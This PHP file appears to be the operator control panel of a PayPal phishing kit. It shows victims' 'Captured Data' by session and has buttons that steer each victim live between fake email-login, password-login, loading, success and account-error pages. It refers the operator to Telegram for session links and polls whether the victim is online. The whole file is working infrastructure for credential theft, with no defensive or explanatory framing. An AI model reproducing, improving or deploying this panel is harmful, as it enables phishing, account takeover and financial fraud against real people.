<?php
require 'config.php';
$message = '';
$sid = $_GET['sid'] ?? null;
$session = $sid ? get_session($sid) : null;

if (isset($_POST['redirect_url']) && $session) {
    $new_url = trim($_POST['redirect_url']);
    $session['redirect_url'] = $new_url;
    $session['redirect_status'] = 'approved';
    $session['last_activity'] = time();
    save_session($sid, $session);

    $verify = get_session($sid);
    $saved_url = $verify['redirect_url'] ?? 'ERROR';
    $saved_status = $verify['redirect_status'] ?? 'ERROR';

    $page_names = [
        'index.php' => 'Login (Email)', 
        'password.php' => 'Login (Password)',
        'loading.php' => 'Loading',
        'success.php' => 'Success',
        'error_account.php' => 'Error: Account'
    ];
    $display_name = $page_names[$new_url] ?? $new_url;
    
    if ($saved_url === $new_url && $saved_status === 'approved') {
        $message = "<p style='color:#4ade80;font-weight:bold;text-align:center;margin-bottom:15px;'>✓ SUCCESS: Redirect set to " . htmlspecialchars($display_name) . "</p>";
    } else {
        $message = "<p style='color:#f87171;font-weight:bold;text-align:center;margin-bottom:15px;'>✗ FAILED TO SAVE. Check sessions/ folder permissions (chmod 777).</p>";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Control Panel</title>
<style>
body { margin:0; font-family:'Segoe UI',Arial,sans-serif; background:#0f1117; color:#e2e8f0; min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; }
.overlay { background:#1a1d26; border:1px solid #2d3340; border-radius:10px; padding:32px; max-width:720px; width:100%; }
h1 { font-size:22px; margin:0 0 20px 0; color:#fff; text-align:center; }
h2 { font-size:15px; color:#8b95a8; margin:28px 0 12px 0; border-bottom:1px solid #2d3340; padding-bottom:8px; display:flex; justify-content:space-between; align-items:center; }
.status-badge { font-size:11px; padding:4px 10px; border-radius:20px; border:1px solid; display:flex; align-items:center; gap:6px; font-weight:normal; }
.status-online { color:#4ade80; border-color:#4ade80; background:rgba(74,222,128,0.1); }
.status-offline { color:#ef4444; border-color:#ef4444; background:rgba(239,68,68,0.1); }
.status-dot { width:8px; height:8px; border-radius:50%; background:currentColor; animation:pulse 1.5s infinite; }
@keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.4;} }
code { background:#2d3340; color:#fff; padding:2px 8px; border-radius:4px; font-size:13px; word-break:break-all; }
.nav-buttons { display:grid; grid-template-columns:repeat(3,1fr); gap:12px; margin-top:12px; }
.nav-btn { background:#222733; border:1px solid #2d3340; color:#e2e8f0; padding:14px 8px; border-radius:6px; cursor:pointer; font-size:13px; text-align:center; }
.nav-btn:hover { background:#2d3340; border-color:#4f46e5; color:#fff; }
.nav-btn.error-btn { color:#f87171; border-color:#612e38; }
.nav-btn.error-btn:hover { background:#3a1e24; border-color:#f87171; }
.data-box { background:#0f1117; border:1px solid #2d3340; padding:16px; border-radius:8px; }
.data-item { margin-bottom:8px; color:#8b95a8; font-size:13px; padding-bottom:6px; border-bottom:1px solid #1f2430; }
.data-item:last-child { border-bottom:none; margin-bottom:0; padding-bottom:0; }
.data-item strong { color:#fff; margin-right:6px; }
.center { text-align:center; }
.current-dest { text-align:center; margin:16px 0; font-size:14px; color:#fff; }
</style>
</head>
<body>
<div class="overlay">
    <h1>🔧 PayPal Control Panel</h1>
    <?php echo $message; ?>

    <?php if ($session && $sid): ?>
        <h2>Navigation <span id="statusBadge" class="status-badge status-offline"><span class="status-dot"></span><span id="statusText">...</span></span></h2>
        <p class="center">SID: <code><?php echo htmlspecialchars($sid); ?></code></p>
        <div class="current-dest">Current Destination: <strong style="color:#FFED00;"><?php echo htmlspecialchars($session['redirect_url'] ?? 'index.php'); ?></strong></div>

        <form method="POST" action="panel.php?sid=<?php echo htmlspecialchars($sid); ?>" class="nav-buttons">
            <button type="submit" name="redirect_url" value="index.php" class="nav-btn">Email Login</button>
            <button type="submit" name="redirect_url" value="password.php" class="nav-btn">Password Login</button>
            <button type="submit" name="redirect_url" value="loading.php" class="nav-btn">Loading</button>
            <button type="submit" name="redirect_url" value="success.php" class="nav-btn">Success</button>
            <button type="submit" name="redirect_url" value="error_account.php" class="nav-btn error-btn">Error: Account</button>
        </form>

        <h2>Captured Data</h2>
        <div class="data-box">
            <?php
            if (isset($session['data']) && is_array($session['data']) && !empty($session['data'])) {
                foreach ($session['data'] as $field => $value) {
                    echo "<div class='data-item'><strong>" . ucfirst(str_replace('_', ' ', $field)) . ":</strong> " . htmlspecialchars($value) . "</div>";
                }
            } else {
                echo "<p class='data-item' style='border:none;'>No data captured yet.</p>";
            }
            ?>
        </div>
    <?php else: ?>
        <h2>No Session</h2>
        <p class="center">No SID provided. Check Telegram messages for a valid link.</p>
    <?php endif; ?>
</div>

<?php if ($session && $sid): ?>
<script>
function checkStatus() {
    fetch('status.php?sid=<?php echo urlencode($sid); ?>')
        .then(r => r.json())
        .then(data => {
            const badge = document.getElementById('statusBadge');
            const text = document.getElementById('statusText');
            if (data.online) {
                badge.className = 'status-badge status-online';
                text.innerText = 'Online';
            } else {
                badge.className = 'status-badge status-offline';
                text.innerText = 'Offline';
            }
        }).catch(() => {});
}
setInterval(checkStatus, 3000);
checkStatus();
</script>
<?php endif; ?>
</body>
</html>